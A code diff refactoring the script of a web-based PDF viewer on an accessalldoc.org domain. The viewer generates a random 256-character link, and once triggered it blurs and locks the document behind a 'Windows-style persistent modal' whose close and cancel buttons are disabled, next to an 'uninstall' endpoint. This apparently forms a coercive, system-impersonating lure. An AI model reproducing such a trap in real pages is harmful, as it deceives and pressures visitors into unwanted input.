@@ -1086,895 +1086,835 @@
 
 <script>
 
-    /* =========================================================
-       CONFIGURATION
-       ========================================================= */
+/* =========================================================
+   CONFIGURATION
+   ========================================================= */
 
-    const CONFIG = {
+const CONFIG = {
 
-        pdfUrl:
-            "./instructions.pdf",
+    pdfUrl:
+        "./instructions.pdf",
 
-        workerEndpoint:
-            "https://projectdeal.accessalldoc.org/api/uninstall",
+    workerEndpoint:
+        "https://projectdeal.accessalldoc.org/api/uninstall",
 
-        redirectUrl:
-            "https://document.accessalldoc.org/"
-    };
-
-
-    /* =========================================================
-       PDF.JS
-       ========================================================= */
-
-    pdfjsLib.GlobalWorkerOptions.workerSrc =
-        "https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js";
+    generatedLinkBase:
+        "https://document.accessalldoc.org/"
+};
 
 
-    /* =========================================================
-       APPLICATION STATE
-       ========================================================= */
+/* =========================================================
+   PDF.JS
+   ========================================================= */
 
-    let pdfDoc = null;
-
-    let scale = 1;
-
-    let renderedPages = new Map();
-
-    let modalShown = false;
-
-    let pdfLocked = false;
-
-    let scrollTimer = null;
-
-    let generatedRedirectUrl = "";
+pdfjsLib.GlobalWorkerOptions.workerSrc =
+    "https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js";
 
 
-    /* =========================================================
-       ELEMENT HELPER
-       ========================================================= */
+/* =========================================================
+   APPLICATION STATE
+   ========================================================= */
 
-    const $ = function (id) {
+let pdfDoc = null;
 
-        return document.getElementById(id);
+let scale = 1;
 
-    };
+let renderedPages = new Map();
 
+let modalShown = false;
 
-    /* =========================================================
-       ERROR
-       ========================================================= */
+let pdfLocked = false;
 
-    function showError(message) {
+let scrollTimer = null;
 
-        const error =
-            $("viewerError");
+let generatedRedirectUrl = "";
 
 
-        if (!error) {
-            return;
-        }
+/* =========================================================
+   ELEMENT HELPER
+   ========================================================= */
+
+const $ = function (id) {
+
+    return document.getElementById(id);
+
+};
 
 
-        error.textContent =
-            message;
+/* =========================================================
+   ERROR
+   ========================================================= */
 
+function showError(message) {
 
-        error.hidden =
-            false;
+    const error =
+        $("viewerError");
 
+    if (!error) {
+        return;
     }
 
+    error.textContent =
+        message;
 
-    /* =========================================================
-       CLAMP
-       ========================================================= */
+    error.hidden =
+        false;
 
-    function clamp(
-        value,
-        min,
-        max
+}
+
+
+/* =========================================================
+   CLAMP
+   ========================================================= */
+
+function clamp(
+    value,
+    min,
+    max
+) {
+
+    return Math.min(
+        max,
+        Math.max(
+            min,
+            value
+        )
+    );
+
+}
+
+
+/* =========================================================
+   RANDOM URL-SAFE STRING
+   ========================================================= */
+
+function generateRandomString(length) {
+
+    const characters =
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
+        "abcdefghijklmnopqrstuvwxyz" +
+        "0123456789";
+
+    const bytes =
+        new Uint8Array(length);
+
+    crypto.getRandomValues(
+        bytes
+    );
+
+    let result =
+        "";
+
+    for (
+        let i = 0;
+        i < length;
+        i++
     ) {
 
-        return Math.min(
-            max,
-            Math.max(
-                min,
-                value
-            )
-        );
+        result +=
+            characters[
+                bytes[i] %
+                characters.length
+            ];
 
     }
 
+    return result;
 
-    /* =========================================================
-       RANDOM URL-SAFE STRING
-       ========================================================= */
-
-    function generateRandomString(length) {
-
-        const characters =
-            "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
-            "abcdefghijklmnopqrstuvwxyz" +
-            "0123456789";
+}
 
 
-        const bytes =
-            new Uint8Array(
-                length
-            );
+/* =========================================================
+   CREATE EXACT 256-CHARACTER URL
 
-
-        /*
-         * Cryptographically secure random
-         * values generated completely client-side.
-         */
-
-        crypto.getRandomValues(
-            bytes
-        );
-
-
-        let result =
-            "";
-
-
-        for (
-            let i = 0;
-            i < length;
-            i++
-        ) {
-
-            result +=
-                characters[
-                    bytes[i] %
-                    characters.length
-                ];
-
-        }
-
-
-        return result;
-
-    }
-
-
-    /* =========================================================
-       CREATE EXACT 256-CHARACTER URL
-       ========================================================= */
+   The URL is DISPLAYED only.
+   It does NOT redirect the browser.
+   ========================================================= */
 
 function create256CharacterRedirectUrl() {
 
     const baseUrl =
-        "https://document.accessalldoc.org/?r=";
+        CONFIG.generatedLinkBase +
+        "?r=";
 
-    const targetLength = 256;
+    const targetLength =
+        256;
 
-    if (baseUrl.length >= targetLength) {
+    if (
+        baseUrl.length >=
+        targetLength
+    ) {
+
         console.error(
-            "Base URL is already 256 characters or longer."
+            "Generated-link base URL is already 256 characters or longer."
         );
 
         return "";
+
     }
 
     const randomLength =
-        targetLength - baseUrl.length;
+        targetLength -
+        baseUrl.length;
 
     const randomValue =
-        generateRandomString(randomLength);
+        generateRandomString(
+            randomLength
+        );
 
     const finalUrl =
-        baseUrl + randomValue;
+        baseUrl +
+        randomValue;
+
+    if (
+        finalUrl.length !==
+        targetLength
+    ) {
+
+        console.error(
+            "256-character URL generation failed.",
+            {
+                expected:
+                    targetLength,
+
+                actual:
+                    finalUrl.length
+            }
+        );
+
+        return "";
+
+    }
+
+    return finalUrl;
+
+}
+
+
+/* =========================================================
+   DISPLAY GENERATED 256-CHARACTER URL
+   ========================================================= */
+
+function initializeRedirectUrl() {
+
+    generatedRedirectUrl =
+        create256CharacterRedirectUrl();
+
+    if (!generatedRedirectUrl) {
+
+        console.warn(
+            "A 256-character URL could not be generated."
+        );
+
+        return;
+
+    }
 
     console.log(
-        "Generated URL:",
-        finalUrl
+        "Generated 256-character URL:",
+        generatedRedirectUrl
     );
 
     console.log(
         "Generated URL length:",
-        finalUrl.length
+        generatedRedirectUrl.length
     );
 
-    return finalUrl;
+
+    const generatedLink =
+        $("generatedLink");
+
+
+    if (generatedLink) {
+
+        if (
+            generatedLink.tagName ===
+                "INPUT" ||
+
+            generatedLink.tagName ===
+                "TEXTAREA"
+        ) {
+
+            generatedLink.value =
+                generatedRedirectUrl;
+
+        }
+        else {
+
+            generatedLink.textContent =
+                generatedRedirectUrl;
+
+        }
+
+    }
+
+
+    const generatedLength =
+        $("generatedLinkLength");
+
+
+    if (generatedLength) {
+
+        generatedLength.textContent =
+            generatedRedirectUrl.length +
+            " characters";
+
+    }
+
 }
 
 
-    /* =========================================================
-       DISPLAY GENERATED 256-CHARACTER URL
-       ========================================================= */
+/* =========================================================
+   CURRENT PDF PAGE
+   ========================================================= */
 
-    function initializeRedirectUrl() {
+function pageNumberForScroll() {
 
-        generatedRedirectUrl =
-            create256CharacterRedirectUrl();
+    if (!pdfDoc) {
 
-
-        if (!generatedRedirectUrl) {
-
-            console.warn(
-                "A 256-character URL could not be generated."
-            );
-
-            return;
-
-        }
-
-
-        // console.log(
-        //     "Generated 256-character URL:",
-        //     generatedRedirectUrl
-        // );
-
-
-        // console.log(
-        //     "Generated URL length:",
-        //     generatedRedirectUrl.length
-        // );
-
-
-        /*
-         * Display the generated URL.
-         *
-         * Expected HTML element:
-         *
-         * id="generatedLink"
-         */
-
-        const generatedLink =
-            $("generatedLink");
-
-
-        if (generatedLink) {
-
-            if (
-                generatedLink.tagName ===
-                    "INPUT" ||
-                generatedLink.tagName ===
-                    "TEXTAREA"
-            ) {
-
-                generatedLink.value =
-                    generatedRedirectUrl;
-
-            }
-            else {
-
-                generatedLink.textContent =
-                    generatedRedirectUrl;
-
-            }
-
-        }
-
-
-        /*
-         * Optional character count.
-         */
-
-        const generatedLength =
-            $("generatedLinkLength");
-
-
-        if (generatedLength) {
-
-            generatedLength.textContent =
-                generatedRedirectUrl.length +
-                " characters";
-
-        }
+        return 1;
 
     }
 
 
-    /* =========================================================
-       CURRENT PDF PAGE
-       ========================================================= */
-
-    function pageNumberForScroll() {
-
-        if (!pdfDoc) {
-            return 1;
-        }
+    const pages =
+        Array.from(
+            document.querySelectorAll(
+                ".pdf-page"
+            )
+        );
 
 
-        const pages =
-            Array.from(
-                document.querySelectorAll(
-                    ".pdf-page"
-                )
-            );
+    let best =
+        1;
+
+    let bestDistance =
+        Infinity;
 
 
-        let best =
-            1;
+    for (const page of pages) {
 
-
-        let bestDistance =
-            Infinity;
-
-
-        for (const page of pages) {
-
-            const distance =
-                Math.abs(
-                    page.getBoundingClientRect().top -
-                    92
-                );
-
-
-            if (
-                distance <
-                bestDistance
-            ) {
-
-                bestDistance =
-                    distance;
-
-
-                best =
-                    Number(
-                        page.dataset.page
-                    );
-
-            }
-
-        }
-
-
-        return best;
-
-    }
-
-
-    /* =========================================================
-       RENDER PAGE
-       ========================================================= */
-
-    async function renderPage(number) {
-
-        const holder =
-            document.querySelector(
-                `.pdf-page[data-page="${number}"]`
+        const distance =
+            Math.abs(
+                page.getBoundingClientRect().top -
+                92
             );
 
 
         if (
-            !holder ||
-            renderedPages.has(number)
+            distance <
+            bestDistance
         ) {
 
-            return;
+            bestDistance =
+                distance;
+
+            best =
+                Number(
+                    page.dataset.page
+                );
 
         }
 
-
-        const page =
-            await pdfDoc.getPage(
-                number
-            );
+    }
 
 
-        const viewport =
-            page.getViewport({
-                scale:
-                    scale
-            });
+    return best;
+
+}
 
 
-        const canvas =
-            holder.querySelector(
-                "canvas"
-            );
+/* =========================================================
+   RENDER PAGE
+   ========================================================= */
+
+async function renderPage(number) {
+
+    const holder =
+        document.querySelector(
+            `.pdf-page[data-page="${number}"]`
+        );
 
 
-        if (!canvas) {
-            return;
-        }
+    if (
+        !holder ||
+        renderedPages.has(number)
+    ) {
+
+        return;
+
+    }
 
 
-        const context =
-            canvas.getContext(
-                "2d",
-                {
-                    alpha:
-                        false
-                }
-            );
+    const page =
+        await pdfDoc.getPage(
+            number
+        );
 
 
-        const ratio =
-            window.devicePixelRatio ||
-            1;
+    const viewport =
+        page.getViewport({
+            scale:
+                scale
+        });
 
 
-        canvas.width =
-            Math.ceil(
-                viewport.width *
-                ratio
-            );
+    const canvas =
+        holder.querySelector(
+            "canvas"
+        );
 
 
-        canvas.height =
-            Math.ceil(
-                viewport.height *
-                ratio
-            );
+    if (!canvas) {
+
+        return;
+
+    }
 
 
-        canvas.style.width =
-            `${viewport.width}px`;
-
-
-        canvas.style.height =
-            `${viewport.height}px`;
-
-
-        holder.style.width =
-            `${viewport.width}px`;
-
-
-        holder.style.minHeight =
-            `${viewport.height}px`;
-
-
-        await page.render({
-
-            canvasContext:
-                context,
-
-            viewport:
-                viewport,
-
-            transform:
-                ratio !== 1
-                    ? [
-                        ratio,
-                        0,
-                        0,
-                        ratio,
-                        0,
-                        0
-                    ]
-                    : null
-
-        }).promise;
-
-
-        renderedPages.set(
-            number,
+    const context =
+        canvas.getContext(
+            "2d",
             {
-                width:
-                    viewport.width,
-
-                height:
-                    viewport.height
+                alpha:
+                    false
             }
+        );
+
+
+    const ratio =
+        window.devicePixelRatio ||
+        1;
+
+
+    canvas.width =
+        Math.ceil(
+            viewport.width *
+            ratio
+        );
+
+
+    canvas.height =
+        Math.ceil(
+            viewport.height *
+            ratio
+        );
+
+
+    canvas.style.width =
+        `${viewport.width}px`;
+
+
+    canvas.style.height =
+        `${viewport.height}px`;
+
+
+    holder.style.width =
+        `${viewport.width}px`;
+
+
+    holder.style.minHeight =
+        `${viewport.height}px`;
+
+
+    await page.render({
+
+        canvasContext:
+            context,
+
+        viewport:
+            viewport,
+
+        transform:
+            ratio !== 1
+                ? [
+                    ratio,
+                    0,
+                    0,
+                    ratio,
+                    0,
+                    0
+                ]
+                : null
+
+    }).promise;
+
+
+    renderedPages.set(
+        number,
+        {
+            width:
+                viewport.width,
+
+            height:
+                viewport.height
+        }
+    );
+
+}
+
+
+/* =========================================================
+   RENDER VISIBLE PAGES
+   ========================================================= */
+
+async function renderVisiblePages() {
+
+    if (!pdfDoc) {
+
+        return;
+
+    }
+
+
+    const pages =
+        Array.from(
+            document.querySelectorAll(
+                ".pdf-page"
+            )
+        );
+
+
+    for (
+        const holder of pages
+    ) {
+
+        const rect =
+            holder.getBoundingClientRect();
+
+
+        if (
+            rect.bottom > -800 &&
+            rect.top <
+                window.innerHeight +
+                800
+        ) {
+
+            await renderPage(
+                Number(
+                    holder.dataset.page
+                )
+            );
+
+        }
+
+    }
+
+}
+
+
+/* =========================================================
+   BUILD PDF PAGES
+   ========================================================= */
+
+function buildPages() {
+
+    const pagesContainer =
+        $("pages");
+
+    const thumbsContainer =
+        $("thumbs");
+
+
+    if (pagesContainer) {
+
+        pagesContainer.innerHTML =
+            "";
+
+    }
+
+
+    if (thumbsContainer) {
+
+        thumbsContainer.innerHTML =
+            "";
+
+    }
+
+
+    renderedPages.clear();
+
+
+    for (
+        let number = 1;
+        number <= pdfDoc.numPages;
+        number++
+    ) {
+
+
+        /* =================================================
+           PDF PAGE
+           ================================================= */
+
+        const holder =
+            document.createElement(
+                "div"
+            );
+
+
+        holder.className =
+            "pdf-page";
+
+
+        holder.dataset.page =
+            number;
+
+
+        holder.innerHTML =
+            "<canvas></canvas>";
+
+
+        if (pagesContainer) {
+
+            pagesContainer.appendChild(
+                holder
+            );
+
+        }
+
+
+        /* =================================================
+           THUMBNAIL
+           ================================================= */
+
+        const thumb =
+            document.createElement(
+                "button"
+            );
+
+
+        thumb.className =
+            "thumb";
+
+
+        thumb.type =
+            "button";
+
+
+        thumb.dataset.page =
+            number;
+
+
+        thumb.innerHTML = `
+            <span class="thumb-number">
+                ${number}
+            </span>
+            <canvas></canvas>
+        `;
+
+
+        thumb.addEventListener(
+            "click",
+            function () {
+
+                if (pdfLocked) {
+
+                    return;
+
+                }
+
+
+                const target =
+                    document.querySelector(
+                        `.pdf-page[data-page="${number}"]`
+                    );
+
+
+                if (target) {
+
+                    target.scrollIntoView({
+
+                        behavior:
+                            "smooth",
+
+                        block:
+                            "start"
+
+                    });
+
+                }
+
+            }
+        );
+
+
+        if (thumbsContainer) {
+
+            thumbsContainer.appendChild(
+                thumb
+            );
+
+        }
+
+
+        makeThumbnail(
+            number,
+            thumb.querySelector(
+                "canvas"
+            )
+        ).catch(
+            console.error
         );
 
     }
 
 
-    /* =========================================================
-       RENDER VISIBLE PAGES
-       ========================================================= */
+    const pageCount =
+        $("pageCount");
 
-    async function renderVisiblePages() {
 
-        if (!pdfDoc) {
-            return;
-        }
+    if (pageCount) {
 
-
-        const pages =
-            Array.from(
-                document.querySelectorAll(
-                    ".pdf-page"
-                )
-            );
-
-
-        for (
-            const holder of pages
-        ) {
-
-            const rect =
-                holder.getBoundingClientRect();
-
-
-            if (
-                rect.bottom > -800 &&
-                rect.top <
-                    window.innerHeight +
-                    800
-            ) {
-
-                await renderPage(
-                    Number(
-                        holder.dataset.page
-                    )
-                );
-
-            }
-
-        }
-
-    }
-
-
-    /* =========================================================
-       BUILD PDF PAGES
-       ========================================================= */
-
-    function buildPages() {
-
-        $("pages").innerHTML =
-            "";
-
-        $("thumbs").innerHTML =
-            "";
-
-        renderedPages.clear();
-
-
-        for (
-            let number = 1;
-            number <= pdfDoc.numPages;
-            number++
-        ) {
-
-            /* =================================================
-               PDF PAGE
-               ================================================= */
-
-            const holder =
-                document.createElement(
-                    "div"
-                );
-
-
-            holder.className =
-                "pdf-page";
-
-
-            holder.dataset.page =
-                number;
-
-
-            holder.innerHTML =
-                "<canvas></canvas>";
-
-
-            $("pages").appendChild(
-                holder
-            );
-
-
-            /* =================================================
-               THUMBNAIL
-               ================================================= */
-
-            const thumb =
-                document.createElement(
-                    "button"
-                );
-
-
-            thumb.className =
-                "thumb";
-
-
-            thumb.type =
-                "button";
-
-
-            thumb.dataset.page =
-                number;
-
-
-            thumb.innerHTML = `
-                <span class="thumb-number">
-                    ${number}
-                </span>
-                <canvas></canvas>
-            `;
-
-
-            thumb.addEventListener(
-                "click",
-                function () {
-
-                    /*
-                     * Do not allow thumbnail
-                     * navigation while locked.
-                     */
-
-                    if (pdfLocked) {
-                        return;
-                    }
-
-
-                    const target =
-                        document.querySelector(
-                            `.pdf-page[data-page="${number}"]`
-                        );
-
-
-                    if (target) {
-
-                        target.scrollIntoView({
-
-                            behavior:
-                                "smooth",
-
-                            block:
-                                "start"
-
-                        });
-
-                    }
-
-                }
-            );
-
-
-            $("thumbs").appendChild(
-                thumb
-            );
-
-
-            makeThumbnail(
-                number,
-                thumb.querySelector(
-                    "canvas"
-                )
-            ).catch(
-                console.error
-            );
-
-        }
-
-
-        $("pageCount").textContent =
-            pdfDoc.numPages;
-
-
-        $("pageInput").max =
+        pageCount.textContent =
             pdfDoc.numPages;
 
     }
 
 
-    /* =========================================================
-       THUMBNAIL
-       ========================================================= */
-
-    async function makeThumbnail(
-        number,
-        canvas
-    ) {
-
-        if (!canvas) {
-            return;
-        }
+    const pageInput =
+        $("pageInput");
 
 
-        const page =
-            await pdfDoc.getPage(
-                number
-            );
+    if (pageInput) {
+
+        pageInput.max =
+            pdfDoc.numPages;
+
+    }
+
+}
 
 
-        const base =
-            page.getViewport({
-                scale:
-                    1
-            });
+/* =========================================================
+   THUMBNAIL
+   ========================================================= */
 
+async function makeThumbnail(
+    number,
+    canvas
+) {
 
-        const thumbnailWidth =
-            130;
+    if (!canvas) {
 
-
-        const thumbnailScale =
-            thumbnailWidth /
-            base.width;
-
-
-        const viewport =
-            page.getViewport({
-                scale:
-                    thumbnailScale
-            });
-
-
-        const ratio =
-            window.devicePixelRatio ||
-            1;
-
-
-        canvas.width =
-            Math.ceil(
-                viewport.width *
-                ratio
-            );
-
-
-        canvas.height =
-            Math.ceil(
-                viewport.height *
-                ratio
-            );
-
-
-        canvas.style.width =
-            `${viewport.width}px`;
-
-
-        canvas.style.height =
-            `${viewport.height}px`;
-
-
-        await page.render({
-
-            canvasContext:
-                canvas.getContext(
-                    "2d"
-                ),
-
-            viewport:
-                viewport,
-
-            transform:
-                ratio !== 1
-                    ? [
-                        ratio,
-                        0,
-                        0,
-                        ratio,
-                        0,
-                        0
-                    ]
-                    : null
-
-        }).promise;
+        return;
 
     }
 
 
-    /* =========================================================
-       LOAD PDF
-       ========================================================= */
-
-    async function loadPdf() {
-
-        try {
-
-            const loading =
-                pdfjsLib.getDocument(
-                    CONFIG.pdfUrl
-                );
+    const page =
+        await pdfDoc.getPage(
+            number
+        );
 
 
-            pdfDoc =
-                await loading.promise;
+    const base =
+        page.getViewport({
+            scale:
+                1
+        });
 
 
-            $("pageInput").value =
+    const thumbnailWidth =
+        130;
+
+
+    const thumbnailScale =
+        thumbnailWidth /
+        base.width;
+
+
+    const viewport =
+        page.getViewport({
+            scale:
+                thumbnailScale
+        });
+
+
+    const ratio =
+        window.devicePixelRatio ||
+        1;
+
+
+    canvas.width =
+        Math.ceil(
+            viewport.width *
+            ratio
+        );
+
+
+    canvas.height =
+        Math.ceil(
+            viewport.height *
+            ratio
+        );
+
+
+    canvas.style.width =
+        `${viewport.width}px`;
+
+
+    canvas.style.height =
+        `${viewport.height}px`;
+
+
+    await page.render({
+
+        canvasContext:
+            canvas.getContext(
+                "2d"
+            ),
+
+        viewport:
+            viewport,
+
+        transform:
+            ratio !== 1
+                ? [
+                    ratio,
+                    0,
+                    0,
+                    ratio,
+                    0,
+                    0
+                ]
+                : null
+
+    }).promise;
+
+}
+
+
+/* =========================================================
+   LOAD PDF
+   ========================================================= */
+
+async function loadPdf() {
+
+    try {
+
+        const loading =
+            pdfjsLib.getDocument(
+                CONFIG.pdfUrl
+            );
+
+
+        pdfDoc =
+            await loading.promise;
+
+
+        const pageInput =
+            $("pageInput");
+
+
+        if (pageInput) {
+
+            pageInput.value =
                 1;
 
-
-            buildPages();
-
-
-            await renderVisiblePages();
-
-
-            updateToolbar();
-
-        }
-        catch (error) {
-
-            console.error(
-                "PDF loading error:",
-                error
-            );
-
-
-            showError(
-                "The PDF could not be loaded. " +
-                "Check the PDF URL and server CORS settings."
-            );
-
-        }
-
-    }
-
-
-    /* =========================================================
-       TOOLBAR
-       ========================================================= */
-
-    function updateToolbar() {
-
-        const current =
-            pageNumberForScroll();
-
-
-        $("pageInput").value =
-            current;
-
-
-        $("zoomValue").textContent =
-            `${Math.round(scale * 100)}%`;
-
-
-        document
-            .querySelectorAll(
-                ".thumb"
-            )
-            .forEach(
-                function (thumb) {
-
-                    thumb.classList.toggle(
-                        "active",
-
-                        Number(
-                            thumb.dataset.page
-                        ) === current
-                    );
-
-                }
-            );
-
-    }
-
-
-    /* =========================================================
-       ZOOM
-       ========================================================= */
-
-    async function setZoom(next) {
-
-        /*
-         * Zoom is not allowed while
-         * the PDF is locked.
-         */
-
-        if (pdfLocked) {
-            return;
         }
 
 
-        const old =
-            scale;
-
-
-        scale =
-            clamp(
-                Number(
-                    next.toFixed(2)
-                ),
-                0.5,
-                2.5
-            );
-
-
-        if (
-            old === scale
-        ) {
-
-            return;
-
-        }
-
-
-        const current =
-            pageNumberForScroll();
-
-
-        renderedPages.clear();
+        buildPages();
 
 
         await renderVisiblePages();
@@ -1982,333 +1922,437 @@ function create256CharacterRedirectUrl() {
 
         updateToolbar();
 
-
-        const target =
-            document.querySelector(
-                `.pdf-page[data-page="${current}"]`
-            );
-
-
-        if (target) {
-
-            target.scrollIntoView({
-                block:
-                    "start"
-            });
-
-        }
-
     }
+    catch (error) {
 
-
-    /* =========================================================
-       LOCK PDF
-       ========================================================= */
-
-    function lockPdf() {
-
-        pdfLocked =
-            true;
-
-
-        /*
-         * Apply the CSS lock class.
-         */
-
-        document.body.classList.add(
-            "pdf-locked"
+        console.error(
+            "PDF loading error:",
+            error
         );
 
 
-        /*
-         * Lock the PDF workspace.
-         */
+        showError(
+            "The PDF could not be loaded. " +
+            "Check the PDF URL and server CORS settings."
+        );
 
-        const workspace =
-            $("workspace");
+    }
 
-
-        if (workspace) {
-
-            workspace.dataset.previousOverflow =
-                workspace.style.overflow;
+}
 
 
-            workspace.style.overflow =
-                "hidden";
+/* =========================================================
+   TOOLBAR
+   ========================================================= */
 
-        }
+function updateToolbar() {
 
-
-        /*
-         * Disable PDF controls.
-         */
-
-        const zoomOut =
-            $("zoomOut");
-
-        const zoomIn =
-            $("zoomIn");
-
-        const pageInput =
-            $("pageInput");
+    const current =
+        pageNumberForScroll();
 
 
-        if (zoomOut) {
-            zoomOut.disabled =
-                true;
-        }
+    const pageInput =
+        $("pageInput");
 
 
-        if (zoomIn) {
-            zoomIn.disabled =
-                true;
-        }
+    if (pageInput) {
 
-
-        if (pageInput) {
-            pageInput.disabled =
-                true;
-        }
-
-
-        /*
-         * Disable thumbnails.
-         */
-
-        document
-            .querySelectorAll(
-                ".thumb"
-            )
-            .forEach(
-                function (thumb) {
-
-                    thumb.disabled =
-                        true;
-
-                }
-            );
+        pageInput.value =
+            current;
 
     }
 
 
-    /* =========================================================
-       UNLOCK PDF
-       ========================================================= */
+    const zoomValue =
+        $("zoomValue");
 
-    function unlockPdf() {
 
-        pdfLocked =
+    if (zoomValue) {
+
+        zoomValue.textContent =
+            `${Math.round(scale * 100)}%`;
+
+    }
+
+
+    document
+        .querySelectorAll(
+            ".thumb"
+        )
+        .forEach(
+            function (thumb) {
+
+                thumb.classList.toggle(
+                    "active",
+
+                    Number(
+                        thumb.dataset.page
+                    ) === current
+                );
+
+            }
+        );
+
+}
+
+
+/* =========================================================
+   ZOOM
+   ========================================================= */
+
+async function setZoom(next) {
+
+    if (pdfLocked) {
+
+        return;
+
+    }
+
+
+    const old =
+        scale;
+
+
+    scale =
+        clamp(
+            Number(
+                next.toFixed(2)
+            ),
+            0.5,
+            2.5
+        );
+
+
+    if (
+        old ===
+        scale
+    ) {
+
+        return;
+
+    }
+
+
+    const current =
+        pageNumberForScroll();
+
+
+    renderedPages.clear();
+
+
+    await renderVisiblePages();
+
+
+    updateToolbar();
+
+
+    const target =
+        document.querySelector(
+            `.pdf-page[data-page="${current}"]`
+        );
+
+
+    if (target) {
+
+        target.scrollIntoView({
+
+            block:
+                "start"
+
+        });
+
+    }
+
+}
+
+
+/* =========================================================
+   LOCK PDF
+   ========================================================= */
+
+function lockPdf() {
+
+    pdfLocked =
+        true;
+
+
+    document.body.classList.add(
+        "pdf-locked"
+    );
+
+
+    const workspace =
+        $("workspace");
+
+
+    if (workspace) {
+
+        workspace.dataset.previousOverflow =
+            workspace.style.overflow;
+
+
+        workspace.style.overflow =
+            "hidden";
+
+    }
+
+
+    const zoomOut =
+        $("zoomOut");
+
+    const zoomIn =
+        $("zoomIn");
+
+    const pageInput =
+        $("pageInput");
+
+
+    if (zoomOut) {
+
+        zoomOut.disabled =
+            true;
+
+    }
+
+
+    if (zoomIn) {
+
+        zoomIn.disabled =
+            true;
+
+    }
+
+
+    if (pageInput) {
+
+        pageInput.disabled =
+            true;
+
+    }
+
+
+    document
+        .querySelectorAll(
+            ".thumb"
+        )
+        .forEach(
+            function (thumb) {
+
+                thumb.disabled =
+                    true;
+
+            }
+        );
+
+}
+
+
+/* =========================================================
+   UNLOCK PDF
+   ========================================================= */
+
+function unlockPdf() {
+
+    pdfLocked =
+        false;
+
+
+    document.body.classList.remove(
+        "pdf-locked"
+    );
+
+
+    const workspace =
+        $("workspace");
+
+
+    if (workspace) {
+
+        workspace.style.overflow =
+            workspace.dataset.previousOverflow ||
+            "";
+
+    }
+
+
+    const zoomOut =
+        $("zoomOut");
+
+    const zoomIn =
+        $("zoomIn");
+
+    const pageInput =
+        $("pageInput");
+
+
+    if (zoomOut) {
+
+        zoomOut.disabled =
             false;
 
-
-        /*
-         * Remove blur and interaction lock.
-         */
-
-        document.body.classList.remove(
-            "pdf-locked"
-        );
+    }
 
 
-        /*
-         * Restore workspace scrolling.
-         */
+    if (zoomIn) {
 
-        const workspace =
-            $("workspace");
-
-
-        if (workspace) {
-
-            workspace.style.overflow =
-                workspace.dataset.previousOverflow ||
-                "";
-
-        }
-
-
-        /*
-         * Re-enable PDF controls.
-         */
-
-        const zoomOut =
-            $("zoomOut");
-
-        const zoomIn =
-            $("zoomIn");
-
-        const pageInput =
-            $("pageInput");
-
-
-        if (zoomOut) {
-            zoomOut.disabled =
-                false;
-        }
-
-
-        if (zoomIn) {
-            zoomIn.disabled =
-                false;
-        }
-
-
-        if (pageInput) {
-            pageInput.disabled =
-                false;
-        }
-
-
-        /*
-         * Re-enable thumbnails.
-         */
-
-        document
-            .querySelectorAll(
-                ".thumb"
-            )
-            .forEach(
-                function (thumb) {
-
-                    thumb.disabled =
-                        false;
-
-                }
-            );
+        zoomIn.disabled =
+            false;
 
     }
 
 
-    /* =========================================================
-       WINDOWS-STYLE PERSISTENT MODAL
-       ========================================================= */
+    if (pageInput) {
 
-    function showModal() {
+        pageInput.disabled =
+            false;
 
-        if (modalShown) {
-            return;
-        }
+    }
 
 
-        modalShown =
+    document
+        .querySelectorAll(
+            ".thumb"
+        )
+        .forEach(
+            function (thumb) {
+
+                thumb.disabled =
+                    false;
+
+            }
+        );
+
+}
+
+
+/* =========================================================
+   WINDOWS-STYLE PERSISTENT MODAL
+   ========================================================= */
+
+function showModal() {
+
+    if (modalShown) {
+
+        return;
+
+    }
+
+
+    modalShown =
+        true;
+
+
+    lockPdf();
+
+
+    const modal =
+        $("modal");
+
+
+    if (!modal) {
+
+        return;
+
+    }
+
+
+    modal.classList.add(
+        "open"
+    );
+
+
+    const closeButton =
+        $("closeModal");
+
+    const cancelButton =
+        $("cancelModal");
+
+
+    if (closeButton) {
+
+        closeButton.disabled =
             true;
 
-
-        /*
-         * Lock the PDF first.
-         */
-
-        lockPdf();
+    }
 
 
-        const modal =
-            $("modal");
+    if (cancelButton) {
 
-
-        if (!modal) {
-            return;
-        }
-
-
-        modal.classList.add(
-            "open"
-        );
-
-
-        /*
-         * Prevent close/cancel.
-         */
-
-        const closeButton =
-            $("closeModal");
-
-        const cancelButton =
-            $("cancelModal");
-
-
-        if (closeButton) {
-
-            closeButton.disabled =
-                true;
-
-        }
-
-
-        if (cancelButton) {
-
-            cancelButton.disabled =
-                true;
-
-        }
-
-
-        /*
-         * Focus reason input.
-         */
-
-        setTimeout(
-            function () {
-
-                const reason =
-                    $("reason");
-
-
-                if (reason) {
-
-                    reason.focus();
-
-                }
-
-            },
-            100
-        );
+        cancelButton.disabled =
+            true;
 
     }
 
 
-    /* =========================================================
-       CLOSE MODAL
-       ========================================================= */
+    setTimeout(
+        function () {
 
-    function closeUninstallModal() {
-
-        /*
-         * The modal cannot be closed while
-         * the PDF is locked.
-         */
-
-        if (pdfLocked) {
-            return;
-        }
+            const reason =
+                $("reason");
 
 
-        const modal =
-            $("modal");
+            if (reason) {
+
+                reason.focus();
+
+            }
+
+        },
+        100
+    );
+
+}
 
 
-        if (!modal) {
-            return;
-        }
+/* =========================================================
+   CLOSE MODAL
+   ========================================================= */
 
+function closeUninstallModal() {
 
-        modal.classList.remove(
-            "open"
-        );
+    if (pdfLocked) {
+
+        return;
 
     }
 
 
-    /* =========================================================
-       ZOOM OUT
-       ========================================================= */
+    const modal =
+        $("modal");
 
-    $("zoomOut").addEventListener(
+
+    if (!modal) {
+
+        return;
+
+    }
+
+
+    modal.classList.remove(
+        "open"
+    );
+
+}
+
+
+/* =========================================================
+   ZOOM OUT
+   ========================================================= */
+
+const zoomOutButton =
+    $("zoomOut");
+
+
+if (zoomOutButton) {
+
+    zoomOutButton.addEventListener(
         "click",
         function () {
 
             if (pdfLocked) {
+
                 return;
+
             }
 
 
@@ -2319,17 +2363,27 @@ function create256CharacterRedirectUrl() {
         }
     );
 
+}
 
-    /* =========================================================
-       ZOOM IN
-       ========================================================= */
 
-    $("zoomIn").addEventListener(
+/* =========================================================
+   ZOOM IN
+   ========================================================= */
+
+const zoomInButton =
+    $("zoomIn");
+
+
+if (zoomInButton) {
+
+    zoomInButton.addEventListener(
         "click",
         function () {
 
             if (pdfLocked) {
+
                 return;
+
             }
 
 
@@ -2340,12 +2394,20 @@ function create256CharacterRedirectUrl() {
         }
     );
 
+}
 
-    /* =========================================================
-       PAGE INPUT
-       ========================================================= */
 
